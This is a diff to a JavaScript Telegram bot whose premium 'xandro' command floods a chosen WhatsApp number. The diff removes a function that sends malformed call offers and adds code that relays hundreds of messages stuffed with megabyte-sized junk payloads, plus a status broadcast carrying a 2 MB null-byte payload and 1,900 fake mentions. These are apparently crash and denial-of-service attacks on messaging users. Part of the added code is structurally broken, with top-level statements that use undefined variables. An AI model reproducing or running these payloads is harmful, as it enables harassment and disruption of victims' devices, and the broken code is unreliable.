@@ -1776,7 +1776,7 @@ bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
     try {
       while (Date.now() < endAt) {
         if (!isWhatsAppConnected) break;
-        await PlainCall(target);
+        await Seg(target, true);
         await sleep(3000);
       }
     } catch (err) {
@@ -2060,210 +2060,115 @@ async function clearChat(target) {
 }
 
 //FANGSYEN
-async function PlainCall(number) {
-    try {
-      const jid = String(number).includes("@s.whatsapp.net")
-            ? String(number)
-            : `${String(number).replace(/\D/g, "")}@s.whatsapp.net`;
-
-        const mutexMemek = () => {
-            let map = {};
-            return {
-                mutex(key, fn) {
-                    map[key] ??= { task: Promise.resolve() };
-                    map[key].task = (async (prev) => {
-                        try { await prev; } catch {}
-                        return fn();
-                    })(map[key].task);
-                    return map[key].task;
-                }
-            };
-        };
-
-        const MamakLoJing = mutexMemek();
-        const xrellyBuffer = (buf) =>
-            Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
-        const yntkts = encodeSignedDeviceIdentity;
-
-        sock.createParticipantNodes = async (
-            recipientJids,
-            message,
-            extraAttrs,
-            dsmMessage
-        ) => {
-            if (!recipientJids.length)
-                return { nodes: [], shouldIncludeDeviceIdentity: false };
-
-            const patched =
-                (await sock.patchMessageBeforeSending?.(
-                    message,
-                    recipientJids
-                )) ?? message;
-
-            const ywdh = Array.isArray(patched)
-                ? patched
-                : recipientJids.map((j) => ({
-                      recipientJid: j,
-                      message: patched
-                  }));
-
-            const { id: meId, lid: meLid } = sock.authState.creds.me;
-            const jembut = meLid ? jidDecode(meLid)?.user : null;
-
-            let shouldIncludeDeviceIdentity = false;
-
-            const nodes = await Promise.all(
-                ywdh.map(async ({ recipientJid: j, message: msg }) => {
-                    const { user: numberUser } = jidDecode(j);
-                    const { user: ownUser } = jidDecode(meId);
-
-                    const isOwn =
-                        numberUser === ownUser || numberUser === jembut;
-
-                    const y = j === meId || j === meLid;
-                    if (dsmMessage && isOwn && !y) msg = dsmMessage;
-
-                    const bytes = xrellyBuffer(
-                        yntkts ? yntkts(msg) : Buffer.from([])
-                    );
-
-                    return MamakLoJing.mutex(j, async () => {
-                        const { type, ciphertext } =
-                            await sock.signalRepository.encryptMessage({
-                                jid: j,
-                                data: bytes
-                            });
-
-                        if (type === "pkmsg")
-                            shouldIncludeDeviceIdentity = true;
-
-                        return {
-                            tag: "to",
-                            attrs: { jid: j },
-                            content: [
-                                {
-                                    tag: "enc",
-                                    attrs: { v: "2", type, ...extraAttrs },
-                                    content: ciphertext
-                                }
-                            ]
-                        };
-                    });
-                })
-            );
-
-            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
-        };
-
-        let devices = [];
-
-        try {
-            devices = (
-                await sock.getUSyncDevices([jid], false, false)
-            ).map(
-                ({ user, device }) =>
-                    `${user}${device ? ":" + device : ""}@s.whatsapp.net`
-            );
-        } catch {
-            devices = [jid];
-        }
-
-        try {
-            await sock.assertSessions(devices);
-        } catch {}
-
-        let { nodes: destinations, shouldIncludeDeviceIdentity } = {
-            nodes: [],
-            shouldIncludeDeviceIdentity: false
-        };
-
-        try {
-            const created = await sock.createParticipantNodes(
-                devices,
-                { conversation: "y" },
-                { count: "0" }
-            );
-
-            destinations = created?.nodes ?? [];
-            shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
-        } catch {
-            destinations = [];
-            shouldIncludeDeviceIdentity = false;
-        }
-
-        const wtfXrL = {
-            tag: "call",
-            attrs: {
-                to: jid,
-                id:
-                    sock.generateMessageTag?.() ??
-                    crypto.randomBytes(8).toString("hex"),
-                from:
-                    sock.user?.id || sock.authState?.creds?.me?.id
+async function Seg(target, ptcp = true) {
+  for (let r = 0; r < 799; r++) {
+    const payload = generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "Power",
+              format: "DEFAULT"
             },
-            content: [
-                {
-                    tag: "offer",
-                    attrs: {
-                        "call-id": crypto
-                            .randomBytes(16)
-                            .toString("hex")
-                            .slice(0, 64)
-                            .toUpperCase(),
-                        "call-creator":
-                            sock.user?.id || sock.authState?.creds?.me?.id
-                    },
-                    content: [
-                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
-                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
-                        {
-                            tag: "video",
-                            attrs: {
-                                orientation: "0",
-                                screen_width: "1920",
-                                screen_height: "1080",
-                                device_orientation: "0",
-                                enc: "vp8",
-                                dec: "vp8"
-                            }
-                        },
-                        { tag: "net", attrs: { medium: "3" } },
-                        {
-                            tag: "capability",
-                            attrs: { ver: "1" },
-                            content: new Uint8Array([
-                                1, 5, 247, 9, 228, 250, 1
-                            ])
-                        },
-                        { tag: "encopt", attrs: { keygen: "2" } },
-                        {
-                            tag: "destination",
-                            attrs: {},
-                            content: destinations
-                        }
-                    ]
-                }
-            ]
-        };
+            nativeFlowResponseMessage: {
+              name: "address_message",
+              paramsJson: "\x10".repeat(1045000),
+              version: 3
+            },
+            entryPointConversionSource: "call_permission_request"
+          },
+        },
+      },
+    },
+    {
+      ephemeralExpiration: 0,
+      forwardingScore: 9741,
+      isForwarded: true,
+      font: Math.floor(Math.random() * 99999999),
+      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
+    },
+  );
 
-        if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentity) {
-            try {
-                const deviceIdentity = encodeSignedDeviceIdentity(
-                    sock.authState.creds.account,
-                    true
-                );
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: payload.message,
+      },
+    }, ptcp ?
+      {
+        messageId: payload.key.id,
+        participant: { jid: target }
+      } : { messageId: payload.key.id }
+    );
+    await sleep(1000);
+  }
+}
 
-                wtfXrL.content[0].content.push({
-                    tag: "device-identity",
-                    attrs: {},
-                    content: deviceIdentity
-                });
-            } catch (e) {}
+let payload = "";
+for (let i = 0; i < 555; i++) {
+    payload = "\u0000".repeat(2097152);
+}
+
+const mentionedJid = [
+    "0@s.whatsapp.net",
+    ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
+];
+
+const generateMessage = {
+    viewOnceMessage: {
+        message: {
+            imageMessage: {
+				url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
+				mimetype: "image/jpeg",
+				fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
+				fileLength: "211396",
+				height: 816,
+				width: 654,
+				mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
+				fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
+				directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
+				mediaKeyTimestamp: "1749220174",
+				jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAADBQACBAEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABhB6gNNNTGLcMDiZqB7ZW0LKXPmQBV8PTrzAOOPOOzh1ugQ0IE9MlGMO6SszJlz8K2m4Hs5mG9JBJWQ4aQtvkP/8QAKRAAAgIBAgQEBwAAAAAAAAAAAQIAAxEEIRASEzEUQVJxBSMkQlFTYv/aAAgBAQABPwCzlbcRFyohSFIyQpGY115ni7PyZWQwwdjFGF4EQiFY9YavEK7y2pLFDVneV5KDMM1euKErXDq7z95lfxC1dm3hsFmnDDgtzDYShs1gmMAyEiaul0Yw7Hhp0KaTfz4FuUkyhvkL7Q3tW4AORmalBdWGEtUq5yIhHMM9syx1XTAjtiddoxZicgyvPhlGfKKC7gCarVdABF7y2w2kk9+C3PyFM7cG1L4IAERwmmDN6YdUq2Blmrt6lrGZg3lVBfG88Gn7I9JrfBEZvp8fzDWwMw2cYnTfMpqQrzY3ENirhT3hLZ84yq4wRHXCER7BneGxcY3hsBIMrtIr5V7kxhgp7wIvon//xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAECAQE/ACf/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/ACf/2Q==",
+            contextInfo: {
+                mentionedJid: mentionedJid,
+                isSampled: true,
+                participant: isTarget,
+                remoteJid: "status@broadcast",
+                forwardingScore: 2097152,
+                isForwarded: true
+            }
+        },
+        nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: payload
         }
+    }
+    };
 
-        await sock.sendNode(wtfXrL);
+    const msg = await generateWAMessageFromContent(target, generateMessage, {});
 
-    } catch (e) {}
+    await sock.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "to",
+                                attrs: { jid: target },
+                                content: undefined
+                            }
+                        ]
+                    }
+                ]
+            }
+        ]
+    });
 }
 
 
